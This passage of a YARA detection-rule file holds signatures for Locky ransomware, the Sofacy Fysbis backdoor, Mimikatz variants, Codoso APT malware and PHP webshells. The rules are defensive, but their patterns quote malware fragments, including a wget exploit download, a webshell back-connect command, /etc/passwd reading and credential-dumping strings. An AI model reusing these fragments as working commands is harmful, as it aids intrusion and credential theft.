( uint16 ( 0 ) == 0x5a4d and ( $x1 or 2 of ( $s* ) ) ) or 3 of them\n}\n\nrule Locky_Ransomware_RID2D91 : CRIME DEMO MAL RANSOM {\n   meta:\n      description = \"Detects Locky Ransomware (matches also on Win32/Kuluoz)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.hybrid-analysis.com/sample/5e945c1d27c9ad77a2b63ae10af46aee7d29a6a43605a9bfbf35cebbcff184d8?environmentId=1\"\n      date = \"2016-02-17 10:37:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"CRIME, DEMO, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 } \n      $o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 } \n   condition: \n      all of ( $o* )\n}\n\nrule Sofacy_Fybis_ELF_Backdoor_Gen1_RID3236 : APT DEMO FILE G0007 G0019 LINUX RUSSIA {\n   meta:\n      description = \"Detects Sofacy Fysbis Linux Backdoor_Naikon_APT_Sample1\"\n      author = \"Florian Roth\"\n      reference = \"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/\"\n      date = \"2016-02-13 13:55:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-20\"\n      hash1 = \"02c7cf55fd5c5809ce2dce56085ba43795f2480423a4256537bfdfda0df85592\"\n      hash2 = \"8bca0031f3b691421cb15f9c6e71ce193355d2d8cf2b190438b6962761d0c6bb\"\n      tags = \"APT, DEMO, FILE, G0007, G0019, LINUX, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Your command not writed to pipe\" fullword ascii\n      $x2 = \"Terminal don`t started for executing command\" fullword ascii\n      $x3 = \"Command will have end with \\\\n\" fullword ascii\n      $s1 = \"WantedBy=multi-user.target' >> /usr/lib/systemd/system/\" ascii\n      $s2 = \"Success execute command or long for waiting executing your command\" fullword ascii\n      $s3 = \"ls /etc | egrep -e\\\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\\\"\" fullword ascii\n      $s4 = \"rm -f /usr/lib/systemd/system/\" ascii\n      $s5 = \"ExecStart=\" fullword ascii\n      $s6 = \"<table><caption><font size=4 color=red>TABLE EXECUTE FILES</font></caption>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 500KB and 1 of ( $x* ) ) or ( 1 of ( $x* ) and 3 of ( $s* ) )\n}\n\nrule Sofacy_Fysbis_ELF_Backdoor_Gen2_RID32AA : APT DEMO FILE G0007 LINUX RUSSIA {\n   meta:\n      description = \"Detects Sofacy Fysbis Linux Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/\"\n      date = \"2016-02-13 14:14:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"02c7cf55fd5c5809ce2dce56085ba43795f2480423a4256537bfdfda0df85592\"\n      hash2 = \"8bca0031f3b691421cb15f9c6e71ce193355d2d8cf2b190438b6962761d0c6bb\"\n      hash3 = \"fd8b2ea9a2e8a67e4cb3904b49c789d57ed9b1ce5bebfe54fe3d98214d6a0f61\"\n      tags = \"APT, DEMO, FILE, G0007, LINUX, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RemoteShell\" ascii\n      $s2 = \"basic_string::_M_replace_dispatch\" fullword ascii\n      $s3 = \"HttpChannel\" ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 500KB and all of them\n}\n\nrule Powerkatz_DLL_Generic_RID2F2F : DEMO EXE GEN HKTL S0002 SCRIPT T1003 T1059_001 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)\"\n      author = \"Florian Roth\"\n      reference = \"PowerKatz Analysis\"\n      date = \"2016-02-05 11:46:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae\"\n      hash2 = \"1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0\"\n      hash3 = \"49e7bac7e0db87bf3f0185e9cf51f2539dbc11384fefced465230c4e5bce0872\"\n      tags = \"DEMO, EXE, GEN, HKTL, S0002, SCRIPT, T1003, T1059_001, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%3u - Directory '%s' (*.kirbi)\" fullword wide\n      $s2 = \"%*s  pPublicKey         : \" fullword wide\n      $s3 = \"<3 eo.oe ~ ANSSI E>\" fullword wide\n      $s4 = \"\\\\*.kirbi\" wide\n      $c1 = \"kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)\" fullword wide\n      $c2 = \"kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them\n}\n\nrule Codoso_PlugX_3_RID2C59 : DEMO EXE FILE G0073 MAL {\n   meta:\n      description = \"Detects Codoso APT PlugX Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, G0073, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Cannot create folder %sDCRC failed in the encrypted file %s. Corrupt file or wrong password.\" fullword wide\n      $s2 = \"mcs.exe\" fullword ascii\n      $s3 = \"McAltLib.dll\" fullword ascii\n      $s4 = \"WinRAR self-extracting archive\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1200KB and all of them\n}\n\nrule Codoso_PlugX_2_RID2C58 : DEMO EXE G0073 MAL {\n   meta:\n      description = \"Detects Codoso APT PlugX Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:45:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, G0073, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%TEMP%\\\\HID\" fullword wide\n      $s2 = \"%s\\\\hid.dll\" fullword wide\n      $s3 = \"%s\\\\SOUNDMAN.exe\" fullword wide\n      $s4 = \"\\\"%s\\\\SOUNDMAN.exe\\\" %d %d\" fullword wide\n      $s5 = \"%s\\\\HID.dllx\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them ) or all of them\n}\n\nrule Codoso_CustomTCP_4_RID2DCC : DEMO EXE FILE G0073 MAL T1007 {\n   meta:\n      description = \"Detects Codoso APT CustomTCP Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ea67d76e9d2e9ce3a8e5f80ff9be8f17b2cd5b1212153fdf36833497d9c060c0\"\n      hash2 = \"130abb54112dd47284fdb169ff276f61f2b69d80ac0a9eac52200506f147b5f8\"\n      hash3 = \"3ea6b2b51050fe7c07e2cf9fa232de6a602aa5eff66a2e997b25785f7cf50daa\"\n      tags = \"DEMO, EXE, FILE, G0073, MAL, T1007\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"varus_service_x86.dll\" fullword ascii\n      $s1 = \"/s %s /p %d /st %d /rt %d\" fullword ascii\n      $s2 = \"net start %%1\" fullword ascii\n      $s3 = \"ping 127.1 > nul\" fullword ascii\n      $s4 = \"McInitMISPAlertEx\" fullword ascii\n      $s5 = \"sc start %%1\" fullword ascii\n      $s6 = \"net stop %%1\" fullword ascii\n      $s7 = \"WorkerRun\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 5 of them ) or ( $x1 and 2 of ( $s* ) )\n}\n\nrule Codoso_CustomTCP_3_RID2DCB : DEMO EXE G0073 MAL {\n   meta:\n      description = \"Detects Codoso APT CustomTCP Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, G0073, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DnsApi.dll\" fullword ascii\n      $s2 = \"softWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\Domains\\\\%s\" ascii\n      $s3 = \"CONNECT %s:%d hTTP/1.1\" ascii\n      $s4 = \"CONNECT %s:%d HTTp/1.1\" ascii\n      $s5 = \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0;)\" ascii\n      $s6 = \"iphlpapi.dll\" ascii\n      $s7 = \"%systemroot%\\\\Web\\\\\" ascii\n      $s8 = \"Proxy-Authorization: Negotiate %s\" ascii\n      $s9 = \"CLSID\\\\{%s}\\\\InprocServer32\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 5 of them ) or 7 of them\n}\n\nrule Codoso_CustomTCP_2_RID2DCA : DEMO EXE FILE G0073 MAL T1007 {\n   meta:\n      description = \"Detects Codoso APT CustomTCP Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, G0073, MAL, T1007\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"varus_service_x86.dll\" fullword ascii\n      $s2 = \"/s %s /p %d /st %d /rt %d\" fullword ascii\n      $s3 = \"net start %%1\" fullword ascii\n      $s4 = \"ping 127.1 > nul\" fullword ascii\n      $s5 = \"McInitMISPAlertEx\" fullword ascii\n      $s6 = \"sc start %%1\" fullword ascii\n      $s7 = \"B_WKNDNSK^\" fullword ascii\n      $s8 = \"net stop %%1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 406KB and all of them\n}\n\nrule Codoso_PGV_PVID_6_RID2CEB : DEMO EXE FILE G0073 MAL T1218_011 {\n   meta:\n      description = \"Detects Codoso APT PGV_PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, G0073, MAL, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"rundll32 \\\"%s\\\",%s\" fullword ascii\n      $s1 = \"/c ping 127.%d & del \\\"%s\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them\n}\n\nrule Codoso_Gh0st_2_RID2C2E : DEMO EXE FILE G0073 MAL T1218_011 {\n   meta:\n      description = \"Detects Codoso APT Gh0st Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, G0073, MAL, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s\" fullword ascii\n      $s1 = \"rundll32.exe \\\"%s\\\", RunMeByDLL32\" fullword ascii\n      $s13 = \"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}\" fullword wide\n      $s14 = \"%s -r debug 1\" fullword ascii\n      $s15 = \"\\\\\\\\.\\\\keymmdrv1\" fullword ascii\n      $s17 = \"RunMeByDLL32\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them\n}\n\nrule Codoso_CustomTCP_RID2D39 : DEMO EXE FILE G0073 MAL {\n   meta:\n      description = \"Codoso CustomTCP Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, G0073, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"wnyglw\" fullword ascii\n      $s5 = \"WorkerRun\" fullword ascii\n      $s7 = \"boazdcd\" fullword ascii\n      $s8 = \"wayflw\" fullword ascii\n      $s9 = \"CODETABL\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 405KB and all of them\n}\n\nrule Codoso_PGV_PVID_5_RID2CEA : DEMO EXE FILE G0073 MAL {\n   meta:\n      description = \"Detects Codoso APT PGV PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75\"\n      hash2 = \"bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe\"\n      tags = \"DEMO, EXE, FILE, G0073, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/c del %s >> NUL\" fullword ascii\n      $s2 = \"%s%s.manifest\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule Codoso_Gh0st_1_RID2C2D : DEMO EXE FILE G0073 MAL T1218_011 T1562_001 {\n   meta:\n      description = \"Detects Codoso APT Gh0st Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:38:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5402c785037614d09ad41e41e11093635455b53afd55aa054a09a84274725841\"\n      hash2 = \"7dc7cec2c3f7e56499175691f64060ebd955813002d4db780e68a8f6e7d0a8f8\"\n      hash3 = \"d7004910a87c90ade7e5ff6169f2b866ece667d2feebed6f0ec856fb838d2297\"\n      tags = \"DEMO, EXE, FILE, G0073, MAL, T1218_011, T1562_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s\" fullword ascii\n      $x2 = \"rundll32.exe \\\"%s\\\", RunMeByDLL32\" fullword ascii\n      $x3 = \"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}\" fullword wide\n      $x4 = \"\\\\\\\\.\\\\keymmdrv1\" fullword ascii\n      $s1 = \"spideragent.exe\" fullword ascii\n      $s2 = \"AVGIDSAgent.exe\" fullword ascii\n      $s3 = \"kavsvc.exe\" fullword ascii\n      $s4 = \"mspaint.exe\" fullword ascii\n      $s5 = \"kav.exe\" fullword ascii\n      $s6 = \"avp.exe\" fullword ascii\n      $s7 = \"NAV.exe\" fullword ascii\n      $c1 = \"Elevation:Administrator!new:\" wide\n      $c2 = \"Global\\\\RUNDLL32EXITEVENT_NAME{12845-8654-543}\" fullword ascii\n      $c3 = \"\\\\sysprep\\\\sysprep.exe\" wide\n      $c4 = \"\\\\sysprep\\\\CRYPTBASE.dll\" wide\n      $c5 = \"Global\\\\TERMINATEEVENT_NAME{12845-8654-542}\" fullword ascii\n      $c6 = \"ConsentPromptBehaviorAdmin\" fullword ascii\n      $c7 = \"\\\\sysprep\" wide\n      $c8 = \"Global\\\\UN{5FFC0C8B-8BE5-49d5-B9F2-BCDC8976EE10}\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 4 of ( $s* ) or 4 of ( $c* ) ) or 1 of ( $x* ) or 6 of ( $c* )\n}\n\nrule Codoso_PGV_PVID_4_RID2CE9 : DEMO EXE FILE G0073 MAL T1543_003 {\n   meta:\n      description = \"Detects Codoso APT PlugX Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75\"\n      hash2 = \"8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761\"\n      hash3 = \"b2950f2e09f5356e985c38b284ea52175d21feee12e582d674c0da2233b1feb1\"\n      tags = \"DEMO, EXE, FILE, G0073, MAL, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"dropper, Version 1.0\" fullword wide\n      $x2 = \"dropper\" fullword wide\n      $x3 = \"DROPPER\" fullword wide\n      $x4 = \"About dropper\" fullword wide\n      $s1 = \"Microsoft Windows Manager Utility\" fullword wide\n      $s2 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" ascii\n      $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\" fullword ascii\n      $s4 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii\n      $s5 = \"<supportedOS Id=\\\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\\\"></supportedOS>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 2 of ( $x* ) and 2 of ( $s* )\n}\n\nrule Codoso_PlugX_1_RID2C57 : DEMO EXE FILE G0073 MAL {\n   meta:\n      description = \"Detects Codoso APT PlugX Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:45:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0b8cbc9b4761ab35acce2aa12ba2c0a283afd596b565705514fd802c8b1e144b\"\n      hash2 = \"448711bd3f689ceebb736d25253233ac244d48cb766834b8f974c2e9d4b462e8\"\n      hash3 = \"fd22547497ce52049083092429eeff0599d0b11fe61186e91c91e1f76b518fe2\"\n      tags = \"DEMO, EXE, FILE, G0073, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GETPASSWORD1\" fullword ascii\n      $s2 = \"NvSmartMax.dll\" fullword ascii\n      $s3 = \"LICENSEDLG\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule Codoso_PGV_PVID_3_RID2CE8 : DEMO G0073 MAL {\n   meta:\n      description = \"Detects Codoso APT PGV PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"126fbdcfed1dfb31865d4b18db2fb963f49df838bf66922fea0c37e06666aee1\"\n      hash2 = \"13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75\"\n      hash3 = \"8a56b476d792983aea0199ee3226f0d04792b70a1c1f05f399cb6e4ce8a38761\"\n      tags = \"DEMO, G0073, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Copyright (C) Microsoft Corporation.  All rights reserved.(C) 2012\" fullword wide\n   condition: \n      $x1\n}\n\nrule Codoso_PGV_PVID_2_RID2CE7 : DEMO EXE FILE G0073 MAL T1218_010 T1543_003 {\n   meta:\n      description = \"Detects Codoso APT PGV PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75\"\n      hash2 = \"b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3\"\n      hash3 = \"bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe\"\n      tags = \"DEMO, EXE, FILE, G0073, MAL, T1218_010, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n      $s1 = \"regsvr32.exe /s \\\"%s\\\"\" fullword ascii\n      $s2 = \"Help and Support\" fullword ascii\n      $s3 = \"netsvcs\" fullword ascii\n      $s9 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs\" fullword ascii\n      $s10 = \"winlogon\" fullword ascii\n      $s11 = \"System\\\\CurrentControlSet\\\\Services\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 907KB and all of them\n}\n\nrule Codoso_PGV_PVID_1_RID2CE6 : DEMO EXE G0073 MAL {\n   meta:\n      description = \"Detects Codoso APT PGV PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:08:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"41a936b0d1fd90dffb2f6d0bcaf4ad0536f93ca7591f7b75b0cd1af8804d0824\"\n      hash2 = \"58334eb7fed37e3104d8235d918aa5b7856f33ea52a74cf90a5ef5542a404ac3\"\n      hash3 = \"934b87ddceabb2063b5e5bc4f964628fe0c63b63bb2346b105ece19915384fc7\"\n      tags = \"DEMO, EXE, G0073, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Cookie: pgv_pvid=\" ascii\n      $x2 = \"DRIVERS\\\\ipinip.sys\" fullword wide\n      $s1 = \"TsWorkSpaces.dll\" fullword ascii\n      $s2 = \"%SystemRoot%\\\\System32\\\\wiaservc.dll\" fullword wide\n      $s3 = \"/selfservice/microsites/search.php?%016I64d\" fullword ascii\n      $s4 = \"/solutions/company-size/smb/index.htm?%016I64d\" fullword ascii\n      $s5 = \"Microsoft Chart ActiveX Control\" fullword wide\n      $s6 = \"MSChartCtrl.ocx\" fullword wide\n      $s7 = \"{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}\" fullword ascii\n      $s8 = \"WUServiceMain\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or 3 of them ) ) or 5 of them\n}\n\nrule Payload_Exe2Hex_RID2CB3 : DEMO SCRIPT T1059 {\n   meta:\n      description = \"Detects payload generated by exe2hex\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/g0tmi1k/exe2hex\"\n      date = \"2016-01-15 10:00:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"set /p \\\"=4d5a\" ascii\n      $a2 = \"powershell -Command \\\"$hex=\" ascii\n      $b1 = \"set+%2Fp+%22%3D4d5\" ascii\n      $b2 = \"powershell+-Command+%22%24hex\" ascii\n      $c1 = \"echo 4d 5a \" ascii\n      $c2 = \"echo r cx >>\" ascii\n      $d1 = \"echo+4d+5a+\" ascii\n      $d2 = \"echo+r+cx+%3E%3E\" ascii\n   condition: \n      all of ( $a* ) or all of ( $b* ) or all of ( $c* ) or all of ( $d* )\n}\n\nrule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57_RID3A88 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ...\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 19:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6\"\n      hash2 = \"f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba\"\n      hash3 = \"16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$_POST['cmd'] = which('\" ascii\n      $s2 = \"$blah = ex(\" ascii\n   condition: \n      filesize < 600KB and all of them\n}\n\nrule Webshell_c100_RID2B9A : DEMO T1087_001 T1105 T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files c100 v. 777shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 09:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092\"\n      hash2 = \"d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5\"\n      hash3 = \"21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06\"\n      tags = \"DEMO, T1087_001, T1105, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<OPTION VALUE=\\\"wget http://ftp.powernet.com.tr/supermail/debug/k3\\\">Kernel attack (Krad.c) PT1 (If wget installed)\" fullword ascii\n      $s1 = \"<center>Kernel Info: <form name=\\\"form1\\\" method=\\\"post\\\" action=\\\"http://google.com/search\\\">\" fullword ascii\n      $s3 = \"cut -d: -f1,2,3 /etc/passwd | grep ::\" ascii\n      $s4 = \"which wget curl w3m lynx\" ascii\n      $s6 = \"netstat -atup | grep IST\" ascii\n   condition: \n      filesize < 685KB and 2 of them\n}\n\nrule Webshell_27_9_acid_c99_locus7s_RID31FA : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 13:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4\"\n      hash2 = \"7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549\"\n      hash3 = \"960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$blah = ex($p2.\\\" /tmp/back \\\".$_POST['backconnectip'].\\\" \\\".$_POST['backconnectport'].\\\" &\\\");\" fullword ascii\n      $s1 = \"$_POST['backcconnmsge']=\\\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\\\";\" fullword ascii\n   condition: \n      filesize < 1711KB and 1 of them\n}\n\nrule Webshell_27_9_c66_c99_RID2E09 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php, c993.txt ...\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 10:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = 